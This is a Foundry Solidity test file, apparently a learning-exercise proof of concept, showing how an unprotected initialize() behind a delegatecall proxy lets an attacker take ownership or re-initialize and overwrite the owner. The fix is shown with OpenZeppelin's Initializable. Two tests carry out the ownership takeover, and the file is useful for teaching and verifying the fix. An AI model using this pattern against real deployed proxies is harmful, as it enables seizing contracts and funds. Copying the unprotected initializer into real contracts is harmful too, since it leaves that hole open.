// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {Initializable} from "@openzeppelin/contracts/proxy/utils/Initializable.sol";

import {SimpleProxy} from "../../src/upgradeable-proxy/SimpleProxy.sol";
import {ImplementationV1} from "../../src/upgradeable-proxy/ImplementationV1.sol";
import {FixedImplementationV1} from "../../src/upgradeable-proxy/FixedImplementationV1.sol";

/// @title ProxyPoC
/// @notice Day 1 PoC: an unprotected `initialize()` behind a delegatecall proxy lets
///         an attacker seize ownership of the proxy's storage.
contract ProxyPoC is Test {
    address internal admin = makeAddr("admin");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant HIJACKED_VALUE = 1337;

    /// @notice Full PoC: attacker initializes the proxy before the admin and becomes owner.
    function testExploit_UnprotectedInitializeLetsAttackerTakeOwnership() public {
        ImplementationV1 implementation = new ImplementationV1();
        SimpleProxy proxy = new SimpleProxy(address(implementation));

        // Interact with the proxy address; `delegatecall` executes implementation code
        // against the proxy's storage slots.
        ImplementationV1 vault = ImplementationV1(address(proxy));

        assertEq(vault.owner(), address(0), "proxy storage should start uninitialized");

        vm.prank(attacker);
        vault.initialize(attacker);

        assertEq(vault.owner(), attacker, "attacker should become owner via initialize");

        vm.prank(attacker);
        vault.setValue(HIJACKED_VALUE);

        assertEq(vault.value(), HIJACKED_VALUE, "attacker should control owner-only state");
    }

    /// @notice Variant: even after the admin initializes, a public initializer can be replayed.
    function testExploit_AttackerCanReinitializeAndOverwriteOwner() public {
        ImplementationV1 implementation = new ImplementationV1();
        SimpleProxy proxy = new SimpleProxy(address(implementation));
        ImplementationV1 vault = ImplementationV1(address(proxy));

        vm.prank(admin);
        vault.initialize(admin);

        assertEq(vault.owner(), admin);

        vm.prank(admin);
        vault.setValue(100);
        assertEq(vault.value(), 100);

        vm.prank(attacker);
        vault.initialize(attacker);

        assertEq(vault.owner(), attacker, "attacker should overwrite the previous owner");

        vm.prank(admin);
        vm.expectRevert("not owner");
        vault.setValue(200);

        vm.prank(attacker);
        vault.setValue(HIJACKED_VALUE);

        assertEq(vault.value(), HIJACKED_VALUE, "attacker should regain control after re-init");
    }

    /// @notice Same re-init attack as the exploit, but `FixedImplementationV1` rejects replayed initialization.
    function testFix_BlocksReinitialize() public {
        FixedImplementationV1 implementation = new FixedImplementationV1();
        SimpleProxy proxy = new SimpleProxy(address(implementation));
        FixedImplementationV1 vault = FixedImplementationV1(address(proxy));

        vm.prank(admin);
        vault.initialize(admin);

        vm.prank(admin);
        vault.setValue(100);
        assertEq(vault.value(), 100);

        vm.prank(attacker);
        vm.expectRevert(Initializable.InvalidInitialization.selector);
        vault.initialize(attacker);

        assertEq(vault.owner(), admin, "owner must remain unchanged");

        vm.prank(admin);
        vault.setValue(200);
        assertEq(vault.value(), 200, "legitimate owner should retain control");

        vm.prank(attacker);
        vm.expectRevert("not owner");
        vault.setValue(HIJACKED_VALUE);
    }

    /// @notice Sanity check: legitimate admin initialization and owner-only updates still work.
    function testFix_AllowsLegitimateInit() public {
        FixedImplementationV1 implementation = new FixedImplementationV1();
        SimpleProxy proxy = new SimpleProxy(address(implementation));
        FixedImplementationV1 vault = FixedImplementationV1(address(proxy));

        vm.prank(admin);
        vault.initialize(admin);

        assertEq(vault.owner(), admin);

        vm.prank(admin);
        vault.setValue(100);

        assertEq(vault.value(), 100);
    }

    /// @notice The logic contract itself must not be initializable; only the proxy storage may be set up.
    function testFix_BlocksDirectInitializeOnImplementation() public {
        FixedImplementationV1 implementation = new FixedImplementationV1();

        vm.expectRevert(Initializable.InvalidInitialization.selector);
        implementation.initialize(admin);
    }
}
